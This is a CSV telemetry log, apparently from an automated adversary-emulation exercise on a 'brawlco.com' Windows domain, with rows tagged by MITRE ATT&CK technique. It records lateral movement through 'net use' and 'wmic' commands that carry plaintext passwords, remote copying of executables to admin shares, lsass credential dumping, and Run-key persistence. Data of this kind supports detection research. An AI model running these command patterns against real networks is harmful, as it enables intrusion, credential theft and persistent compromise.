create,escue-pc.brawlco.com,1106628e-6840-44eb-9dde-3b6674bba339,3636.0,2017-05-01T19:02:14.553000+00:00,2017-05-01T19:02:14.386000+00:00,event,process,2108.0,escue-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\born.exe /f,95,,,,,,,
add,escue-pc.brawlco.com,5e9822f5-f1c3-409d-b97f-8b8ceb9f1cb5,,2017-05-01T19:02:15.189000+00:00,2017-05-01T19:02:14.267000+00:00,event,registry,,escue-pc.brawlco.com,,96,,,,,C:\born.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
,,b496562e-0463-4b3d-81ad-604026110e2c,,,,step,,,,,97,,,"['1106628e-6840-44eb-9dde-3b6674bba339', '5e9822f5-f1c3-409d-b97f-8b8ceb9f1cb5']","[{'technique_name': 'Registry Run Keys / Start Folder', 'technique_id': 'T1060', 'tactic': ['Persistence']}]",,,
create,escue-pc.brawlco.com,d4b333d0-1f4a-492d-b96f-d3a6b4803b96,3092.0,2017-05-01T19:02:19.419000+00:00,2017-05-01T19:02:19.041000+00:00,event,process,2108.0,escue-pc.brawlco.com,net use \\fulco-pc.brawlco.com\C$ Yr%8AddoYM /user:brawlco\rfulco,98,,,,,,,
,,66ef7f1b-56b7-4f61-958a-e5dd2c723f70,,,,step,,,,,99,,,['d4b333d0-1f4a-492d-b96f-d3a6b4803b96'],"[{'technique_name': 'Windows Admin Shares', 'technique_id': 'T1077', 'tactic': ['Lateral Movement']}]",,,
create,escue-pc.brawlco.com,6518838c-0607-439e-b044-e4f1b821f457,3052.0,2017-05-01T19:02:23.887000+00:00,2017-05-01T19:02:23.496000+00:00,event,process,2108.0,escue-pc.brawlco.com,"cmd /c copy ""C:\born.exe"" ""\\fulco-pc.brawlco.com\C$\born.exe""",100,,,,,,,
create,fulco-pc.brawlco.com,ba9b6480-8642-46d4-be3e-340f7c4728ac,,2017-05-01T19:02:24.295000+00:00,2017-05-01T19:02:23.389000+00:00,event,file,,fulco-pc.brawlco.com,,101,C:\born.exe,,,,,,
,,3d256d32-ab10-4ece-84de-73f3aa82f9f9,,,,step,,,,,102,,,"['6518838c-0607-439e-b044-e4f1b821f457', 'ba9b6480-8642-46d4-be3e-340f7c4728ac']","[{'technique_name': 'Remote File Copy', 'technique_id': 'T1105', 'tactic': ['Lateral Movement']}]",,,
create,mims-pc.brawlco.com,af4f3e38-63fa-4e5a-9034-1a28569ab543,2120.0,2017-05-01T19:02:25.606000+00:00,2017-05-01T19:02:25.230000+00:00,event,process,3764.0,mims-pc.brawlco.com,"wmic /node:""fulco-pc.brawlco.com"" /user:""brawlco\rfulco"" /password:""Yr%8AddoYM"" process call create ""C:\born.exe -d -f""",103,,,,,,,
,,8c446093-13da-4fb2-8147-22ca45835f53,,,,step,,,,,104,,,['af4f3e38-63fa-4e5a-9034-1a28569ab543'],"[{'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047', 'tactic': ['Execution']}]",,,
create,fulco-pc.brawlco.com,fa1a3423-a7e1-49e1-b997-46191c93e1f8,1884.0,2017-05-01T19:02:51.258000+00:00,2017-05-01T19:02:31.789000+00:00,event,process,164.0,fulco-pc.brawlco.com,powershell -command -,105,,,,,,,
open,fulco-pc.brawlco.com,30637c02-4e33-446d-acf7-f2b31859192e,,2017-05-01T19:02:51.258000+00:00,2017-05-01T19:02:31.789000+00:00,event,process,,fulco-pc.brawlco.com,,106,C:\Windows\System32\lsass.exe,1884.0,,,,,
,,5a7b50bc-2e67-4bb3-a384-5615de59a738,,,,step,,,,,107,,,"['fa1a3423-a7e1-49e1-b997-46191c93e1f8', '30637c02-4e33-446d-acf7-f2b31859192e']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
create,fulco-pc.brawlco.com,e83ca471-1089-4287-8a98-e540654d4b96,3488.0,2017-05-01T19:03:00.613000+00:00,2017-05-01T19:02:59.964000+00:00,event,process,164.0,fulco-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\born.exe /f,108,,,,,,,
add,fulco-pc.brawlco.com,e018674d-b014-4c3b-8493-c821136d62d9,,2017-05-01T19:03:01.208000+00:00,2017-05-01T19:02:59.838000+00:00,event,registry,,fulco-pc.brawlco.com,,109,,,,,C:\born.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
,,c6315b9a-f266-47a8-a8b9-f3ce5ae4d43d,,,,step,,,,,110,,,"['e83ca471-1089-4287-8a98-e540654d4b96', 'e018674d-b014-4c3b-8493-c821136d62d9']","[{'technique_name': 'Registry Run Keys / Start Folder', 'technique_id': 'T1060', 'tactic': ['Persistence']}]",,,
create,sounder-pc.brawlco.com,23b195d7-b275-4780-8d74-0851fa79a5c0,1324.0,2017-05-01T19:03:08.951000+00:00,2017-05-01T19:03:08.724000+00:00,event,process,3468.0,sounder-pc.brawlco.com,net use \\teston-pc.brawlco.com\C$ BYHaF]X7ur /user:brawlco\cteston,111,,,,,,,
,,963d4dc6-7108-4f09-a757-31eb9c4fa952,,,,step,,,,,112,,,['23b195d7-b275-4780-8d74-0851fa79a5c0'],"[{'technique_name': 'Windows Admin Shares', 'technique_id': 'T1077', 'tactic': ['Lateral Movement']}]",,,
create,sounder-pc.brawlco.com,814c3a48-1ab8-4f54-8970-034fed2fc43b,3888.0,2017-05-01T19:03:16.819000+00:00,2017-05-01T19:03:16.575000+00:00,event,process,3468.0,sounder-pc.brawlco.com,"cmd /c copy ""C:\and.exe"" ""\\teston-pc.brawlco.com\C$\west.exe""",113,,,,,,,
create,teston-pc.brawlco.com,b4a12ed9-58f5-46f4-9bc7-a271ef731ce5,,2017-05-01T19:03:17.236000+00:00,2017-05-01T19:03:16.460000+00:00,event,file,,teston-pc.brawlco.com,,114,C:\west.exe,,,,,,
,,e23b85ad-63ea-4dc6-8a47-c0027f6aeb1b,,,,step,,,,,115,,,"['814c3a48-1ab8-4f54-8970-034fed2fc43b', 'b4a12ed9-58f5-46f4-9bc7-a271ef731ce5']","[{'technique_name': 'Remote File Copy', 'technique_id': 'T1105', 'tactic': ['Lateral Movement']}]",,,
create,ostermeyer-pc.brawlco.com,8b8686ff-cbed-4f3e-a975-e37b63ab798c,3168.0,2017-05-01T19:03:19.093000+00:00,2017-05-01T19:03:18.157000+00:00,event,process,3752.0,ostermeyer-pc.brawlco.com,"wmic /node:""teston-pc.brawlco.com"" /user:""brawlco\cteston"" /password:""BYHaF]X7ur"" process call create ""C:\west.exe -d -f""",116,,,,,,,
,,7c9a29ad-9098-4fc6-8395-4372e8c167aa,,,,step,,,,,117,,,['8b8686ff-cbed-4f3e-a975-e37b63ab798c'],"[{'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047', 'tactic': ['Execution']}]",,,
create,teston-pc.brawlco.com,1cc79846-5da1-4c81-b97e-fb30f9c88a55,1700.0,2017-05-01T19:03:41.630000+00:00,2017-05-01T19:03:29.513000+00:00,event,process,928.0,teston-pc.brawlco.com,powershell -command -,118,,,,,,,
open,teston-pc.brawlco.com,e2eb586e-6e8f-4239-8a5e-31a16ac76f80,,2017-05-01T19:03:41.630000+00:00,2017-05-01T19:03:29.513000+00:00,event,process,,teston-pc.brawlco.com,,119,C:\Windows\System32\lsass.exe,1700.0,,,,,
,,a2697bd1-8bbf-4aec-9833-dfa3abd6f9cc,,,,step,,,,,120,,,"['1cc79846-5da1-4c81-b97e-fb30f9c88a55', 'e2eb586e-6e8f-4239-8a5e-31a16ac76f80']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
create,teston-pc.brawlco.com,1f0adda0-7a13-4ae3-afba-0b19f07d6b2e,4004.0,2017-05-01T19:03:56.220000+00:00,2017-05-01T19:03:56.028000+00:00,event,process,928.0,teston-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\west.exe /f,121,,,,,,,
add,teston-pc.brawlco.com,9613ff5c-1820-496b-b68a-0e266b04b25e,,2017-05-01T19:03:56.893000+00:00,2017-05-01T19:03:55.896000+00:00,event,registry,,teston-pc.brawlco.com,,122,,,,,C:\west.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
,,4e32cb21-6b1c-4087-9f1b-4adeb83f3a23,,,,step,,,,,123,,,"['1f0adda0-7a13-4ae3-afba-0b19f07d6b2e', '9613ff5c-1820-496b-b68a-0e266b04b25e']","[{'technique_name': 'Registry Run Keys / Start Folder', 'technique_id': 'T1060', 'tactic': ['Persistence']}]",,,
create,ostermeyer-pc.brawlco.com,989d8198-3fd2-4f10-95fa-e1aa799fe8e7,2188.0,2017-05-01T19:04:10.555000+00:00,2017-05-01T19:04:10.351000+00:00,event,process,3752.0,ostermeyer-pc.brawlco.com,net use \\platten-pc.brawlco.com\C$ NhEN5tHJ#n /user:brawlco\aplatten,124,,,,,,,
,,3756fd70-8941-4008-9772-d0b2ee03fd24,,,,step,,,,,125,,,['989d8198-3fd2-4f10-95fa-e1aa799fe8e7'],"[{'technique_name': 'Windows Admin Shares', 'technique_id': 'T1077', 'tactic': ['Lateral Movement']}]",,,
create,ostermeyer-pc.brawlco.com,b1b62f2b-605b-4137-81e1-0341cd8a56fb,3828.0,2017-05-01T19:04:24.314000+00:00,2017-05-01T19:04:24.039000+00:00,event,process,3752.0,ostermeyer-pc.brawlco.com,"cmd /c copy ""C:\born.exe"" ""\\platten-pc.brawlco.com\C$\and.exe""",126,,,,,,,
create,platten-pc.brawlco.com,9a7a831d-64ba-4b62-aa95-faf2ac9318a3,,2017-05-01T19:04:24.977000+00:00,2017-05-01T19:04:23.821000+00:00,event,file,,platten-pc.brawlco.com,,127,C:\and.exe,,,,,,
,,7858bd50-440d-47e3-a590-bfa714cc33ef,,,,step,,,,,128,,,"['b1b62f2b-605b-4137-81e1-0341cd8a56fb', '9a7a831d-64ba-4b62-aa95-faf2ac9318a3']","[{'technique_name': 'Remote File Copy', 'technique_id': 'T1105', 'tactic': ['Lateral Movement']}]",,,
create,mims-pc.brawlco.com,79142ffb-0360-4af2-99e4-eeda9b9613b2,3372.0,2017-05-01T19:04:26.581000+00:00,2017-05-01T19:04:26.257000+00:00,event,process,3764.0,mims-pc.brawlco.com,"wmic /node:""platten-pc.brawlco.com"" /user:""brawlco\aplatten"" /password:""NhEN5tHJ#n"" process call create ""C:\and.exe -d -f""",129,,,,,,,
,,f6250ad2-6b35-4936-8eb7-747c38f0d143,,,,step,,,,,130,,,['79142ffb-0360-4af2-99e4-eeda9b9613b2'],"[{'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047', 'tactic': ['Execution']}]",,,
create,platten-pc.brawlco.com,31c89334-1747-4914-a82e-d4a780f2b72d,2428.0,2017-05-01T19:04:55.582000+00:00,2017-05-01T19:04:44.448000+00:00,event,process,3912.0,platten-pc.brawlco.com,powershell -command -,131,,,,,,,
open,platten-pc.brawlco.com,55ffd694-0bc5-4e8e-91d1-3df93def737b,,2017-05-01T19:04:55.582000+00:00,2017-05-01T19:04:44.448000+00:00,event,process,,platten-pc.brawlco.com,,132,C:\Windows\System32\lsass.exe,2428.0,,,,,
,,579948d5-43f4-4da6-acde-dafa2aadd4d8,,,,step,,,,,133,,,"['31c89334-1747-4914-a82e-d4a780f2b72d', '55ffd694-0bc5-4e8e-91d1-3df93def737b']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
create,platten-pc.brawlco.com,6f2eb1b8-5d21-49c6-832a-6f35494c8461,1748.0,2017-05-01T19:05:17.881000+00:00,2017-05-01T19:05:17.681000+00:00,event,process,3912.0,platten-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\and.exe /f,134,,,,,,,
add,platten-pc.brawlco.com,de0aa9af-e419-4b6c-9511-99425599e399,,2017-05-01T19:05:18.532000+00:00,2017-05-01T19:05:17.548000+00:00,event,registry,,platten-pc.brawlco.com,,135,,,,,C:\and.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
,,701e8324-70c3-4fcf-b4f7-7bae482aec16,,,,step,,,,,136,,,"['6f2eb1b8-5d21-49c6-832a-6f35494c8461', 'de0aa9af-e419-4b6c-9511-99425599e399']","[{'technique_name': 'Registry Run Keys / Start Folder', 'technique_id': 'T1060', 'tactic': ['Persistence']}]",,,
create,ostermeyer-pc.brawlco.com,c13d2de3-318d-421b-8ff0-118ae1dce1f5,3344.0,2017-05-01T19:05:39.696000+00:00,2017-05-01T19:05:39.510000+00:00,event,process,3752.0,ostermeyer-pc.brawlco.com,net use \\colgan-pc.brawlco.com\C$ 8.ax8T34yI /user:brawlco\scolgan,137,,,,,,,
,,a1ef6558-c66f-409c-b0c8-90017100fbcd,,,,step,,,,,138,,,['c13d2de3-318d-421b-8ff0-118ae1dce1f5'],"[{'technique_name': 'Windows Admin Shares', 'technique_id': 'T1077', 'tactic': ['Lateral Movement']}]",,,
create,ostermeyer-pc.brawlco.com,9832f3a3-0b1d-4da3-90aa-559e53ffb7da,3280.0,2017-05-01T19:06:01.720000+00:00,2017-05-01T19:06:01.524000+00:00,event,process,3752.0,ostermeyer-pc.brawlco.com,"cmd /c copy ""C:\born.exe"" ""\\colgan-pc.brawlco.com\C$\and.exe""",139,,,,,,,
create,colgan-pc.brawlco.com,72d71255-5686-4934-8702-600e4282a8c4,,2017-05-01T19:06:02.189000+00:00,2017-05-01T19:06:01.372000+00:00,event,file,,colgan-pc.brawlco.com,,140,C:\and.exe,,,,,,
,,f35d232c-8076-4e46-84f4-8c21062293d1,,,,step,,,,,141,,,"['9832f3a3-0b1d-4da3-90aa-559e53ffb7da', '72d71255-5686-4934-8702-600e4282a8c4']","[{'technique_name': 'Remote File Copy', 'technique_id': 'T1105', 'tactic': ['Lateral Movement']}]",,,
create,fulco-pc.brawlco.com,911d796a-b9fe-4e01-ba1e-afc184436c21,2288.0,2017-05-01T19:06:04.356000+00:00,2017-05-01T19:06:03.463000+00:00,event,process,164.0,fulco-pc.brawlco.com,"wmic /node:""colgan-pc.brawlco.com"" /user:""brawlco\scolgan"" /password:""8.ax8T34yI"" process call create ""C:\and.exe -d -f""",142,,,,,,,
,,e5b1c0af-fe6f-4240-9d35-c375f2479c90,,,,step,,,,,143,,,['911d796a-b9fe-4e01-ba1e-afc184436c21'],"[{'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047', 'tactic': ['Execution']}]",,,
create,colgan-pc.brawlco.com,f0044838-4038-4c7f-89ad-5c94eaac91df,824.0,2017-05-01T19:06:36.370000+00:00,2017-05-01T19:06:26.344000+00:00,event,process,856.0,colgan-pc.brawlco.com,powershell -command -,144,,,,,,,
open,colgan-pc.brawlco.com,85f9b60e-8003-4b18-9559-ff13071dbd5f,,2017-05-01T19:06:36.370000+00:00,2017-05-01T19:06:26.344000+00:00,event,process,,colgan-pc.brawlco.com,,145,C:\Windows\System32\lsass.exe,824.0,,,,,
,,778131e9-ff6f-4024-b7c5-c838a774437d,,,,step,,,,,146,,,"['f0044838-4038-4c7f-89ad-5c94eaac91df', '85f9b60e-8003-4b18-9559-ff13071dbd5f']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
create,colgan-pc.brawlco.com,e64a3353-2da8-4e41-ae72-0bd16c7ff1a1,2904.0,2017-05-01T19:07:00.102000+00:00,2017-05-01T19:06:59.840000+00:00,event,process,856.0,colgan-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\and.exe /f,147,,,,,,,
add,colgan-pc.brawlco.com,65d80ce0-b80a-4739-8a8f-a20e2361b0f1,,2017-05-01T19:07:00.856000+00:00,2017-05-01T19:06:59.696000+00:00,event,registry,,colgan-pc.brawlco.com,,148,,,,,C:\and.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
,,f9db544d-fee7-44ae-b7ab-0a0c8862b907,,,,step,,,,,149,,,"['e64a3353-2da8-4e41-ae72-0bd16c7ff1a1', '65d80ce0-b80a-4739-8a8f-a20e2361b0f1']","[{'technique_name': 'Registry Run Keys / Start Folder', 'technique_id': 'T1060', 'tactic': ['Persistence']}]",,,
create,santilli-pc.brawlco.com,848e198d-8c76-45f5-939b-55f280dfa1bf,2424.0,2017-05-01T19:07:22.788000+00:00,2017-05-01T19:07:22.496000+00:00,event,process,4004.0,santilli-pc.brawlco.com,net use \\zissler-pc.brawlco.com\C$ X#sMtEVe0] /user:brawlco\szissler,150,,,,,,,
,,9a68e983-1d65-4806-b907-a96f1118818b,,,,step,,,,,151,,,['848e198d-8c76-45f5-939b-55f280dfa1bf'],"[{'technique_name': 'Windows Admin Shares', 'technique_id': 'T1077', 'tactic': ['Lateral Movement']}]",,,
create,santilli-pc.brawlco.com,1b9c583b-94f8-401c-9152-6eefca77e0c3,3952.0,2017-05-01T19:07:45.198000+00:00,2017-05-01T19:07:44.958000+00:00,event,process,4004.0,santilli-pc.brawlco.com,"cmd /c copy ""C:\born.exe"" ""\\zissler-pc.brawlco.com\C$\and.exe""",152,,,,,,,
create,zissler-pc.brawlco.com,bfc6b516-607f-482a-b5fb-12e3b6faa414,,2017-05-01T19:07:45.722000+00:00,2017-05-01T19:07:44.793000+00:00,event,file,,zissler-pc.brawlco.com,,153,C:\and.exe,,,,,,
,,bad8097e-81c9-4a86-9761-3b44b15144d2,,,,step,,,,,154,,,"['1b9c583b-94f8-401c-9152-6eefca77e0c3', 'bfc6b516-607f-482a-b5fb-12e3b6faa414']","[{'technique_name': 'Remote File Copy', 'technique_id': 'T1105', 'tactic': ['Lateral Movement']}]",,,
create,ostermeyer-pc.brawlco.com,08156a18-6088-4a6c-b14b-31455ffb50bc,3148.0,2017-05-01T19:07:47.557000+00:00,2017-05-01T19:07:47.127000+00:00,event,process,3752.0,ostermeyer-pc.brawlco.com,"wmic /node:""zissler-pc.brawlco.com"" /user:""brawlco\szissler"" /password:""X#sMtEVe0]"" process call create ""C:\and.exe -d -f""",155,,,,,,,
,,d0174c8c-142f-457c-98ba-e7659d782a4f,,,,step,,,,,156,,,['08156a18-6088-4a6c-b14b-31455ffb50bc'],"[{'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047', 'tactic': ['Execution']}]",,,
create,zissler-pc.brawlco.com,521aaa20-8d0a-44c4-b9d4-da69133bcd9a,1644.0,2017-05-01T19:08:31.133000+00:00,2017-05-01T19:08:11.177000+00:00,event,process,3388.0,zissler-pc.brawlco.com,powershell -command -,157,,,,,,,
open,zissler-pc.brawlco.com,a9e82dfd-e5ac-4bb0-9139-7369705c14d3,,2017-05-01T19:08:31.133000+00:00,2017-05-01T19:08:11.178000+00:00,event,process,,zissler-pc.brawlco.com,,158,C:\Windows\System32\lsass.exe,1644.0,,,,,
,,a2e45b18-427b-4a32-aa86-0d293e7360e9,,,,step,,,,,159,,,"['521aaa20-8d0a-44c4-b9d4-da69133bcd9a', 'a9e82dfd-e5ac-4bb0-9139-7369705c14d3']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
create,zissler-pc.brawlco.com,f0fcb10a-db9b-4979-8022-d11dce451a2c,2524.0,2017-05-01T19:08:54.645000+00:00,2017-05-01T19:08:54.447000+00:00,event,process,3388.0,zissler-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\and.exe /f,160,,,,,,,
add,zissler-pc.brawlco.com,3c4f7023-35e1-4371-aad8-57f946112a1a,,2017-05-01T19:08:55.537000+00:00,2017-05-01T19:08:54.299000+00:00,event,registry,,zissler-pc.brawlco.com,,161,,,,,C:\and.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
,,f11b831b-c0da-490e-ba58-79458f4d1f22,,,,step,,,,,162,,,"['f0fcb10a-db9b-4979-8022-d11dce451a2c', '3c4f7023-35e1-4371-aad8-57f946112a1a']","[{'technique_name': 'Registry Run Keys / Start Folder', 'technique_id': 'T1060', 'tactic': ['Persistence']}]",,,
create,mims-pc.brawlco.com,8570d037-76fc-487f-a9be-893827ec3905,316.0,2017-05-01T19:09:17.608000+00:00,2017-05-01T19:09:17.401000+00:00,event,process,3764.0,mims-pc.brawlco.com,net use \\peele-pc.brawlco.com\C$ 5miEQ6*Sj] /user:brawlco\npeele,163,,,,,,,
,,e6d4f5de-fc4e-44fc-90e4-f5779927914b,,,,step,,,,,164,,,['8570d037-76fc-487f-a9be-893827ec3905'],"[{'technique_name': 'Windows Admin Shares', 'technique_id': 'T1077', 'tactic': ['Lateral Movement']}]",,,
create,mims-pc.brawlco.com,44597672-40f7-450d-83a8-352d64fc591b,3532.0,2017-05-01T19:09:40.186000+00:00,2017-05-01T19:09:39.971000+00:00,event,process,3764.0,mims-pc.brawlco.com,"cmd /c copy ""C:\raised.exe"" ""\\peele-pc.brawlco.com\C$\born.exe""",165,,,,,,,
create,peele-pc.brawlco.com,bf01bb38-7f58-45f6-a49a-b779c456d7e9,,2017-05-01T19:09:40.755000+00:00,2017-05-01T19:09:39.823000+00:00,event,file,,peele-pc.brawlco.com,,166,C:\born.exe,,,,,,
,,5761b4d6-50bc-44b9-92d5-d1d46c057060,,,,step,,,,,167,,,"['44597672-40f7-450d-83a8-352d64fc591b', 'bf01bb38-7f58-45f6-a49a-b779c456d7e9']","[{'technique_name': 'Remote File Copy', 'technique_id': 'T1105', 'tactic': ['Lateral Movement']}]",,,
create,zissler-pc.brawlco.com,dfe0345c-a543-42c5-bca0-1cea191c2256,1260.0,2017-05-01T19:09:43.377000+00:00,2017-05-01T19:09:42.341000+00:00,event,process,3388.0,zissler-pc.brawlco.com,"wmic /node:""peele-pc.brawlco.com"" /user:""brawlco\npeele"" /password:""5miEQ6*Sj]"" process call create ""C:\born.exe -d -f""",168,,,,,,,
,,e39b5a9e-554f-43cc-9677-5616a84241bc,,,,step,,,,,169,,,['dfe0345c-a543-42c5-bca0-1cea191c2256'],"[{'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047', 'tactic': ['Execution']}]",,,
create,peele-pc.brawlco.com,e2cde13f-34b9-4df6-ad5c-7e57f32c07f8,3432.0,2017-05-01T19:10:15.233000+00:00,2017-05-01T19:10:05.811000+00:00,event,process,3820.0,peele-pc.brawlco.com,powershell -command -,170,,,,,,,
open,peele-pc.brawlco.com,8ca582de-a896-41d4-b876-8485508b25c0,,2017-05-01T19:10:15.233000+00:00,2017-05-01T19:10:05.811000+00:00,event,process,,peele-pc.brawlco.com,,171,C:\Windows\System32\lsass.exe,3432.0,,,,,
,,fa4ea9e0-3dea-49f5-9774-7d3e59729aec,,,,step,,,,,172,,,"['e2cde13f-34b9-4df6-ad5c-7e57f32c07f8', '8ca582de-a896-41d4-b876-8485508b25c0']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
create,peele-pc.brawlco.com,4acdb5ea-d860-4d68-abf8-ad10a6ce9579,1668.0,2017-05-01T19:10:39.512000+00:00,2017-05-01T19:10:39.287000+00:00,event,process,3820.0,peele-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\born.exe /f,173,,,,,,,
add,peele-pc.brawlco.com,31d611f2-93f2-42b8-a5ac-0a35ecc7927f,,2017-05-01T19:10:40.362000+00:00,2017-05-01T19:10:39.100000+00:00,event,registry,,peele-pc.brawlco.com,,174,,,,,C:\born.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
,,22591eaa-e275-443b-8d25-7ffb7a1503ed,,,,step,,,,,175,,,"['4acdb5ea-d860-4d68-abf8-ad10a6ce9579', '31d611f2-93f2-42b8-a5ac-0a35ecc7927f']","[{'technique_name': 'Registry Run Keys / Start Folder', 'technique_id': 'T1060', 'tactic': ['Persistence']}]",,,
create,platten-pc.brawlco.com,be041eff-855f-4555-8fe7-2ea3edcde30a,3452.0,2017-05-01T19:11:02.670000+00:00,2017-05-01T19:11:02.220000+00:00,event,process,3912.0,platten-pc.brawlco.com,net use \\kressierer-pc.brawlco.com\C$ 22.%drRAvp /user:brawlco\tkressierer,176,,,,,,,
,,1c5845f9-8edb-47d0-89c8-4aefdaa24fd8,,,,step,,,,,177,,,['be041eff-855f-4555-8fe7-2ea3edcde30a'],"[{'technique_name': 'Windows Admin Shares', 'technique_id': 'T1077', 'tactic': ['Lateral Movement']}]",,,
create,platten-pc.brawlco.com,bce4788e-5842-4f94-9784-6def032f4acf,1156.0,2017-05-01T19:11:25.646000+00:00,2017-05-01T19:11:25.243000+00:00,event,process,3912.0,platten-pc.brawlco.com,"cmd /c copy ""C:\and.exe"" ""\\kressierer-pc.brawlco.com\C$\philadelphia.exe""",178,,,,,,,
create,kressierer-pc.brawlco.com,8da94661-be7b-48d7-bb97-bab2d33fc15c,,2017-05-01T19:11:26.224000+00:00,2017-05-01T19:11:25.088000+00:00,event,file,,kressierer-pc.brawlco.com,,179,C:\philadelphia.exe,,,,,,
,,7a8203f4-8536-42bc-a67d-f5ecf3a42e9a,,,,step,,,,,180,,,"['bce4788e-5842-4f94-9784-6def032f4acf', '8da94661-be7b-48d7-bb97-bab2d33fc15c']","[{'technique_name': 'Remote File Copy', 'technique_id': 'T1105', 'tactic': ['Lateral Movement']}]",,,
create,mims-pc.brawlco.com,54c8871c-4cdb-4d05-973e-dbb0d45dffe2,140.0,2017-05-01T19:11:28.408000+00:00,2017-05-01T19:11:28.063000+00:00,event,process,3764.0,mims-pc.brawlco.com,"wmic /node:""kressierer-pc.brawlco.com"" /user:""brawlco\tkressierer"" /password:""22.%drRAvp"" process call create ""C:\philadelphia.exe -d -f""",181,,,,,,,
,,9bebb67e-e27e-4f11-901a-bbe8602a834c,,,,step,,,,,182,,,['54c8871c-4cdb-4d05-973e-dbb0d45dffe2'],"[{'technique_name': 'Windows Management Instrumentation', 'technique_id': 'T1047', 'tactic': ['Execution']}]",,,
create,kressierer-pc.brawlco.com,8d86d0e9-116a-4690-b089-0bcf30c2b5e0,2372.0,2017-05-01T19:12:02.714000+00:00,2017-05-01T19:11:51.063000+00:00,event,process,3520.0,kressierer-pc.brawlco.com,powershell -command -,183,,,,,,,
open,kressierer-pc.brawlco.com,37b7f547-9640-4361-821f-96baa414c9cb,,2017-05-01T19:12:02.714000+00:00,2017-05-01T19:11:51.063000+00:00,event,process,,kressierer-pc.brawlco.com,,184,C:\Windows\System32\lsass.exe,2372.0,,,,,
,,4191cf78-7e2b-4db6-983f-7e43f03922b2,,,,step,,,,,185,,,"['8d86d0e9-116a-4690-b089-0bcf30c2b5e0', '37b7f547-9640-4361-821f-96baa414c9cb']","[{'technique_name': 'Credential Dumping', 'technique_id': 'T1003', 'tactic': ['Credential Access']}]",,,
create,kressierer-pc.brawlco.com,41605d62-3cb6-42b2-8f13-b793f9c3f427,1756.0,2017-05-01T19:12:26.650000+00:00,2017-05-01T19:12:26.430000+00:00,event,process,3520.0,kressierer-pc.brawlco.com,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v caldera /d C:\philadelphia.exe /f,186,,,,,,,
add,kressierer-pc.brawlco.com,74793781-1d36-40ce-bd34-784d3aaf7642,,2017-05-01T19:12:27.494000+00:00,2017-05-01T19:12:26.263000+00:00,event,registry,,kressierer-pc.brawlco.com,,187,,,,,C:\philadelphia.exe,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,caldera
,,ddc334a4-2833-49ea-951a-88003cce534d,,,,step,,,,,188,,,"['41605d62-3cb6-42b2-8f13-b793f9c3f427', '74793781-1d36-40ce-bd34-784d3aaf7642']","[{'technique_name': 'Registry Run Keys / Start Folder', 'technique_id': 'T1060', 'tactic': ['Persistence']}]",,,
create,colgan-pc.brawlco.com,6a542bf0-d0ba-4443-9f59-367264b2561d,2060.0,2017-05-01T19:12:50.300000+00:00,2017-05-01T19:12:49.890000+00:00,event,process,856.0,colgan-pc.brawlco.com,net use \\minahan-pc.brawlco.com\C$ qSR]r8XmKX /user:brawlco\gminahan,189,,,,,,,
,,aa1ad3c1-2606-4e9b-ba11-dfc2bcd6c668,,,,step,,,,,190,,,['6a542bf0-d0ba-4443-9f59-367264b2561d'],"[{'technique_name': 'Windows Admin Shares', 'technique_id': 'T1077', 'tactic': ['Lateral Movement']}]",,,
create,colgan-pc.brawlco.com,a769c18f-d445-453c-b8c9-d963c4245299,1360.0,2017-05-01T19:13:13.073000+00:00,2017-05-01T19:13:12.815000+00:00,event,process,856.0,colgan-pc.brawlco.com,"cmd /c copy ""C:\and.exe"" ""\\minahan-pc.brawlco.com\C$\west.exe""",191,,,,,,,
create,minahan-pc.brawlco.com,601cdda3-4467-4973-a149-bb9897072c29,,2017-05-01T19:13:13.676000+00:00,2017-05-01T19:13:12.642000+00:00,event,file,,minahan-pc.brawlco.com,,192,C:\west.exe,,,,,,
,,fca1ae87-566c-44e7-ad4f-2539c63cb26e,,,,step,,,,,193,,,"['a769c18f-d445-453c-b8c9-d963c4245299', '601cdda3-4467-4973-a149-bb9897072c29']","[{'technique_name': 'Remote File Copy', 'technique_id': 'T1105', 'tactic': ['Lateral Movement']}]",,,
